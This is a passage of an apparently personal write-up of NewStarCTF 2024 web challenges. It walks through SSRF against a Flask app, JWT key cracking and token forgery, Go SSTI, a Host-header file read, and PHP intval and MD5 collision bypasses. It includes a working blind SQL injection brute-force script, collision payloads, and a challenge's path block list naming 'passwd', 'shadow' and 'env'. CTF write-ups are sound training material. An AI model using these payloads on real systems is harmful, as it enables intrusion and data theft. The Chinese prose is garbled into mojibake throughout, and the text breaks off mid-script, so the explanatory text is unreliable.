class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- å›¾æ ‡èƒ½å¤Ÿæ­£å¸¸æ˜¾ç¤ºè€¶! --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- ä½†æ˜¯æˆ‘å¥½åƒæ²¡æœ‰çœ‹åˆ°Nginxæˆ–è€…Apacheä¹‹ç±»çš„ä¸œè¥¿ --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- è¯´æ˜æœåŠ¡å™¨è„šæœ¬èƒ½å¤Ÿå¤„ç†é™æ€æ–‡ä»¶æ --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- é‚£æºç æ˜¯ä¸æ˜¯å¯ä»¥ç”¨æŸäº›åŠæ³•æ‹¿åˆ°å‘¢! --&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123; text &#125;&#125;&lt;br&gt;</span></span><br><span class="line"><span class="string">            &#123;% if logged_in %&#125;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot;&gt;ç™»å‡º&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &#123;% else %&#125;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;ç™»å½•&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                ç”¨æˆ·å: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                å¯†ç : &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;ç™»å½•&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &#123;% if user==&quot;admin&quot; %&#125;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/admin&quot;&gt;Go to admin panel&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;/2.png&quot;&gt;</span></span><br><span class="line"><span class="string">            &#123;% else %&#125;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;/1.png&quot;&gt;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, text=text, logged_in=logged_in, user=data.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> verify_token(token)</span><br><span class="line">        resp_text = render_template_string(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">            &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;head&gt;</span></span><br><span class="line"><span class="string">                &lt;title&gt;Admin Panel&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;/head&gt;</span></span><br><span class="line"><span class="string">            &lt;body&gt;</span></span><br><span class="line"><span class="string">                &lt;h1&gt;Admin Panel&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;GET Server Info from api:&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;input&quot; value=&#123;&#123;api_url&#125;&#125; id=&quot;api&quot; readonly&gt;</span></span><br><span class="line"><span class="string">                &lt;button onclick=execute()&gt;Execute&lt;/button&gt;</span></span><br><span class="line"><span class="string">                &lt;script&gt;</span></span><br><span class="line"><span class="string">                    function execute() &#123;</span></span><br><span class="line"><span class="string">                        fetch(&quot;&#123;&#123;url&#125;&#125;/execute?api_address=&quot;+document.getElementById(&quot;api&quot;).value,</span></span><br><span class="line"><span class="string">                                      &#123;credentials: &quot;include&quot;&#125;</span></span><br><span class="line"><span class="string">                                      ).then(res =&gt; res.text()).then(data =&gt; &#123;</span></span><br><span class="line"><span class="string">                            document.write(data);</span></span><br><span class="line"><span class="string">                        &#125;);</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &lt;/script&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;</span></span><br><span class="line"><span class="string">            &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>, api_url=request.host_url+<span class="string">&quot;/api&quot;</span>, url=request.host_url)</span><br><span class="line">        resp = make_response(resp_text)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>] = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/execute&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> verify_token(token)</span><br><span class="line">    api_address = request.args.get(<span class="string">&quot;api_address&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> api_address:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;No api address!&quot;</span>, <span class="number">400</span>)</span><br><span class="line">    response = requests.get(api_address, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> verify_token(token)</span><br><span class="line">    resp = make_response(<span class="string">f&quot;Server Info: <span class="subst">&#123;os.popen(<span class="string">&#x27;uname -a&#x27;</span>).read()&#125;</span>&quot;</span>)</span><br><span class="line">    resp.headers[<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>] = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:file&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">static_file</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="built_in">print</span>(file)</span><br><span class="line">    restricted_keywords = [<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;etc&quot;</span>, </span><br><span class="line">                           <span class="string">&quot;bin&quot;</span>, <span class="string">&quot;lib&quot;</span>, <span class="string">&quot;tmp&quot;</span>, <span class="string">&quot;var&quot;</span>, <span class="string">&quot;run&quot;</span>, <span class="string">&quot;dev&quot;</span>, <span class="string">&quot;home&quot;</span>, <span class="string">&quot;boot&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> file <span class="keyword">for</span> keyword <span class="keyword">in</span> restricted_keywords):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;STOP!&quot;</span>, <span class="number">404</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;./static/&quot;</span> + file):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Not found!&quot;</span>, <span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&quot;./static/&quot;</span> + file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>åˆ†ææºä»£ç å‘ç°è¿™é‡Œç”¨äº†JWTä»¤ç‰Œè¿›è¡Œèº«ä»½éªŒè¯ï¼Œè€Œä¸”å¯†é’¥åªæœ‰å…­ä½æ•°å­—ï¼ï¼å®Œå…¨å¯ä»¥çˆ†ç ´ã€‚</p><p>è¿™é‡Œè¿˜ç»™äº†ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼Œç›´æ¥ç”¨æä¾›çš„ç”¨æˆ·è´¦å·ç™»è¿›å»ï¼Œè·å–ä¸€ä¸ªtokenæ ·ä¾‹</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph6.png" class=""><p>ç”¨JWTcrackç ´è§£å¯†é’¥</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph8.png" class=""><p>ç”¨åœ¨çº¿JWTç”Ÿæˆæ¥ä¼ªé€ ä»¤ç‰Œï¼Œ<em>æ³¨æ„è¿™é‡Œçš„expé‡ŒåŒ…å«äº†ä»¤ç‰Œçš„æœ‰æ•ˆæ—¶é—´ï¼Œå¯ä»¥é€šè¿‡æŠŠæ•°å­—åŠ å¤§æ¥å»¶é•¿æœ‰æ•ˆæ—¶é—´</em></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph10.png" class=""><p>æˆåŠŸä¼ªé€ adminèº«ä»½</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph11.png" class=""><p>ç®¡ç†å‘˜é¢æ¿ç»™äº†ä¸€ä¸ªapiï¼Œå¯ä»¥è®¿é—®æœ¬åœ°é“¾æ¥ï¼Œé‚£ä¹ˆåº”è¯¥æœ‰ä¸€ä¸ªSSRFæ¼æ´åœ¨è¿™é‡Œï¼Œä½†æ˜¯åœ¨å“ªå‘¢ï¼Ÿ</p><p>ç»§ç»­åˆ†ææºä»£ç ï¼Œå‘ç°ä¸€ä¸ªå¥‡æ€ªçš„åœ°æ–¹</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph12.png" class=""><p>å¯è§è¿™é‡Œå¯¼å…¥äº†ä¸€ä¸ªè‡ªå®šä¹‰åº“ï¼Œé‚£åº”è¯¥å°±æ˜¯åœ¨ä¸app.pyçš„åŒç›®å½•ä¸‹æœ‰ä¸€ä¸ªflag.py</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph14.png" class=""><p>å¾—åˆ°å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random_number_string</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">9</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length)])</span><br><span class="line"></span><br><span class="line">get_flag = Flask(<span class="string">&quot;get_flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.pop(<span class="string">&quot;ICQ_FLAG&quot;</span>, <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@get_flag.route(<span class="params"><span class="string">&quot;/fl4g&quot;</span></span>)</span></span><br><span class="line"><span class="comment">#å¦‚ä½•è§¦å‘å®ƒå‘¢?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">return</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag.run(host=<span class="string">&quot;127.0.0.1&quot;</span>,port=<span class="number">5001</span>)</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨ç®¡ç†å‘˜é¢æ¿è®¿é—®5001ç«¯å£çš„&#x2F;fl4gå³å¯</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph15.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph16.png" class=""><h2 id="è‡­å±è¸©è¸©èƒŒ"><a href="#è‡­å±è¸©è¸©èƒŒ" class="headerlink" title="è‡­å±è¸©è¸©èƒŒ"></a>è‡­å±è¸©è¸©èƒŒ</h2><p>è¥¿ç”µç»ˆç«¯çš„ç¯å¢ƒåäº†ï¼Œå†™ä¸äº†ï¼Œè¿™é‡Œæ”¾ä¸€ä¸‹å®˜æ–¹é¢˜è§£çš„é“¾æ¥ã€è®²çš„å¾ˆå¥½ï¼Œå¼ºæ¨ï¼ï¼ï¼ã€‘</p><p><a href="https://ctf.xidian.edu.cn/training/14?challenge=620&tab=answer">NewStar CTF 2024 - è¥¿ç”µ CTF ç»ˆç«¯</a></p><h2 id="blindsql1"><a href="#blindsql1" class="headerlink" title="blindsql1"></a>blindsql1</h2><p>sqlmapä¸ä¼šç”¨ï¼Œä»¥å‰ä»æ¥æ²¡æœ‰æ‰‹æ•²è¿‡ç›²æ³¨è„šæœ¬ï¼Œè¿™é‡Œå°±ç®€å•è®°ä¸€ä¸‹é¢˜è§£çš„è„šæœ¬ï¼Œä»¥åå½“æ¨¡æ¿ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,string,time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] Bruting at <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.ascii_letters + string.digits + <span class="string">&#x27;_-&#123;&#125;&#x27;</span>:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>) <span class="comment"># é™åˆ¶é€Ÿç‡ï¼Œé˜²æ­¢è¯·æ±‚è¿‡å¿«</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Trying:&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¿™æ¡è¯­å¥èƒ½æŸ¥è¯¢åˆ°å½“å‰æ•°æ®åº“æ‰€æœ‰çš„è¡¨å</span></span><br><span class="line">        tables = <span class="string">f&#x27;(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># è·å–æ‰€æœ‰è¡¨åçš„ç¬¬ i ä¸ªå­—ç¬¦ï¼Œå¹¶è®¡ç®— ascii å€¼</span></span><br><span class="line">        char = <span class="string">f&#x27;(ord(mid(<span class="subst">&#123;tables&#125;</span>,<span class="subst">&#123;i&#125;</span>,1)))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># çˆ†ç ´è¯¥ ascii å€¼</span></span><br><span class="line">        b = <span class="string">f&#x27;((<span class="subst">&#123;char&#125;</span>)in(<span class="subst">&#123;<span class="built_in">ord</span>(c)&#125;</span>))&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># è‹¥ ascii çŒœå¯¹äº†ï¼Œåˆ™ and åé¢çš„ç»“æœæ˜¯ trueï¼Œä¼šè¿”å› Alice çš„æ•°æ®</span></span><br><span class="line">        p = <span class="string">f&#x27;Alice\&#x27;and(<span class="subst">&#123;b&#125;</span>)#&#x27;</span></span><br><span class="line"></span><br><span class="line">        res = requests.get(url, params=&#123;<span class="string">&#x27;student_name&#x27;</span>: p&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Alice&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]bingo:&#x27;</span>,c)</span><br><span class="line">            result += c</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>union</code>Â è¢«ç¦ç”¨ï¼Œè¯´æ˜æ­¤æ—¶è¯¥ä½¿ç”¨ç›²æ³¨ï¼Œæˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡æ’å…¥Â <code>and 1</code>Â æˆ–è€…Â <code>and 0</code>Â æ¥æ§åˆ¶æ˜¯å¦è¿”å›æ•°æ®ï¼Œç”±æ­¤å¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨</p><p><code>=</code>Â çš„ç»•è¿‡å¯ä»¥ä½¿ç”¨Â <code>like</code>Â æˆ–è€…Â <code>in</code>Â ä»£æ›¿</p><p>ç©ºæ ¼å’Œæ–œæ Â <code>/</code>Â è¢«ç¦ç”¨ï¼Œå¯ä»¥ä½¿ç”¨æ‹¬å·ä»£æ›¿</p><h1 id="Week-4"><a href="#Week-4" class="headerlink" title="Week 4"></a>Week 4</h1><h2 id="Pangbaiè¿‡å®¶å®¶ï¼ˆ4ï¼‰"><a href="#Pangbaiè¿‡å®¶å®¶ï¼ˆ4ï¼‰" class="headerlink" title="Pangbaiè¿‡å®¶å®¶ï¼ˆ4ï¼‰"></a>Pangbaiè¿‡å®¶å®¶ï¼ˆ4ï¼‰</h2><p>æ‰“å¼€å‘ç°è¿™ä¹ˆä¸€ä¸ªä¸œè¥¿ï¼Œé—®äº†é—®AIï¼Œæ˜¯Goè¯­è¨€çš„SSTIï¼Œäºæ˜¯èµ¶ç´§å»å­¦äº†ä¸€ä¸‹Goè¯­è¨€SSTIç›¸å…³çš„ä¸œè¥¿</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_0.png" class=""><p>ç›¸å…³æ–‡ç« ï¼š<a href="https://blog.csdn.net/Elite__zhb/article/details/134352384">[Goè¯­è¨€]SSTIä»0åˆ°1_go ssti-CSDNåšå®¢</a></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4.png" class=""><p>åˆ†æç»™æˆ‘ä»¬çš„æºä»£ç ï¼Œå¯çŸ¥å½“å‰å¯¹è±¡æ˜¯helperï¼Œæœ‰ä¸¤ä¸ªæˆå‘˜ç»“æ„ä½“ï¼Œæˆ‘ä»¬è¦çœ‹çš„Configï¼Œå› ä¸ºConfigç»™äº†æˆ‘JWTçš„keyï¼Œä¸ç”¨å¾€ä¸‹ç¿»å°±çŸ¥é“å¾…ä¼šå„¿è®¾è®¡cookieä¼ªé€ ã€‚</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_2.png" class=""><p>æ‹¿åˆ°å¯†é’¥ï¼Œç›´æ¥ä¸¢åˆ°åœ¨çº¿å¹³å°ä¼ªé€ ã€‚ï¼ˆ<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>ï¼Œè¿™ä¸ªå¥½ä½¿ï¼‰</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_4.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_3.png" class=""><p>ç»§ç»­å¾€ä¸‹çœ‹å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶è¯»å–å‡½æ•°ï¼Œåº”è¯¥æ˜¯ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œè¯»çš„æ˜¯config.SignaturePathçš„å†…å®¹ï¼Œè¦æƒ³åŠæ³•å¯¹å†…å®¹è¿›è¡Œç¯¡æ”¹ã€‚</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_8.png" class=""><p>ç›¸å…³ä»£ç åœ¨è¿™é‡Œï¼Œå¯è§è¦ç”¨PUTæ–¹æ³•ï¼Œè€Œä¸”è¦æ±‚IPä¸ºæœ¬æœºã€‚æŠŠè¦ä¿®æ”¹çš„è·¯å¾„æ”¾åœ¨åŒ…çš„ä¸»ä½“å³å¯ã€‚</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_6.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_7.png" class=""><p>è¿™é‡Œæˆ‘ä»¬ç›´æ¥æ”¹åŒ…ï¼Œç„¶ååŠ ä¸€ä¸ªæŠ¥å¤´Hostï¼Œè®¾ç½®ä¸ºæœ¬æœºã€‚è¯»å–ç¯å¢ƒå˜é‡æ–‡ä»¶ã€‚</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_9.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/p4_10.png" class=""><h2 id="chocolate"><a href="#chocolate" class="headerlink" title="chocolate"></a>chocolate</h2><p>é¦–å…ˆè¿›è¡Œç›®å½•æ‰«æï¼Œæ‰«å‡ºä¸€ä¸ªæ–‡ä»¶</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho1.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho2.png" class=""><p>æ ¹æ®æ–‡ä»¶å†…å®¹è½¬åˆ°ç›¸åº”é¡µé¢</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho3.png" class=""><p>è¿™é‡Œè¦æ±‚ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«å­—ç¬¦0ï¼Œä¸å«å­—æ¯ï¼Œä¸”è¦æ±‚æ•´æ•°åŒ–ç­‰äº1337ã€‚ä¸€å¼€å§‹çš„æ€è·¯æ˜¯ç›´æ¥ä¼ å…¥å…«è¿›åˆ¶çš„0</p><p>2471ï¼Œè¿™æ ·intvalå‡½æ•°ä¼šå°†å…¶è¯†åˆ«ä¸ºå…«è¿›åˆ¶å¹¶è‡ªåŠ¨è½¬åŒ–ä¸ºåè¿›åˆ¶æ•´æ•°1337ï¼Œ</p><p>ä½†æ˜¯ç”±äºè¿™é‡Œ0åœ¨ç¬¬ä¸€ä½ï¼Œå¯¹åº”ç´¢å¼•å·ä¸º0ï¼Œstropsè¿”å›0ï¼Œåˆ™ï¼strposçš„åˆ¤æ–­ç»“æœä¸ºçœŸï¼Œå¯¼è‡´dieæ‰</p><p>æ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦åœ¨02471å‰åŠ ä¸€ä¸ªç©ºæ ¼ï¼Œï¼ˆ%20æ˜¯ç©ºæ ¼çš„urlç¼–ç ï¼‰</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho4.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho5.png" class=""><p>æˆåŠŸæ‹¿åˆ°ä¿¡æ¯ï¼Œé™¤äº†ç»™å‡ºä¸€ä¸ªæˆåˆ†ä¹‹å¤–ï¼Œè¿˜ç»™äº†ä¸€ä¸²å­—ç¬¦ï¼Œè®©æˆ‘ä»¬å¯¹å…¶è§£å¯†</p><p>è¯¢é—®deepseekå‘ç°æ˜¯ROT13åŠ å¯†ï¼Œå¯¹å…¶è¿›è¡Œè§£å¯†</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho6.png" class=""><p>å¾—åˆ°ä¸‹ä¸€ä¸ªè·¯å¾„</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho7.png" class=""><p>é¦–å…ˆï¼Œgetä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œè¦æ±‚å…¶md5ç›¸åŒ</p><p>ç”±äºæ˜¯å¼ºæ¯”è¾ƒï¼Œè€Œä¸”è¿‡æ»¤äº†æ•°ç»„ï¼Œæ‰€ä»¥åªèƒ½ä¸Šç½‘å»æ‰¾å¼ºç¢°æ’çš„å­—ç¬¦</p><p><a href="https://blog.csdn.net/m0_73818134/article/details/131793815">md5å¼ºæ¯”è¾ƒçš„å‡ ç§ç»•è¿‡ï¼Œå¼ºç¢°æ’ï¼Œshalå¼ºæ¯”è¾ƒçš„å‡ ç§ç»•è¿‡ï¼Œå¼ºç¢°æ’_md5å¼ºæ¯”è¾ƒç»•è¿‡-CSDNåšå®¢</a></p><p>åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ç»„æ»¡è¶³æ¡ä»¶çš„å‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line">&amp;dog=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure><p>ä¸‹ä¸€æ­¥æ˜¯postä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œè¦æ±‚å…¶è‡ªèº«ä¸è‡ªèº«çš„md5å¼±ç›¸ç­‰</p><p>è¿™ä¸æ˜¯ä¼ ç»Ÿçš„å¼±ç›¸ç­‰ï¼Œä¼ ç»Ÿçš„é¢˜åªéœ€è¦æ‰¾ä¸€ä¸ªå¼€å¤´ä¸ºå­—æ¯ä¸”md5ä¸º0eå¼€å¤´çš„å­—ç¬¦ä¸²å³å¯</p><p>ä½†è¿™æ–¹æ³•åœ¨æœ¬é¢˜è¡Œä¸é€šï¼Œå› ä¸ºè¿™é¢˜çš„phpç‰ˆæœ¬æ˜¯8</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho8.png" class=""><p><a href="https://blog.csdn.net/qq_44879989/article/details/133230251">PHP å˜åŠ¨ï¼šPHP 8 ç‰ˆæœ¬ä¸‹å­—ç¬¦ä¸²ä¸æ•°å€¼çš„å¼±æ¯”è¾ƒ_php éšå¼è½¬æ¢æ¯”è¾ƒ-CSDNåšå®¢</a></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cho10.png" class=""><p>æ‰€ä»¥åªèƒ½æ‰¾æ•°å€¼å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯æœ¬èº«æ˜¯0eå¼€å¤´ï¼Œmd5åä»æ˜¯0eå¼€å¤´</p><p>è¿™æ ·çš„å­—ç¬¦ä¸²ä¹Ÿä¸å°‘ï¼Œæ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e215962017</span><br></pre></td></tr></table></figure><p>æœ€åä¸€æ­¥ï¼Œä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶md5ä»¥8031bå¼€å¤´</p><p>è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå¼ºæ¯”è¾ƒï¼Œæ²¡æœ‰åŠæ³•ï¼Œåªèƒ½å†™è„šæœ¬å°è¯•ç¢°æ’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span 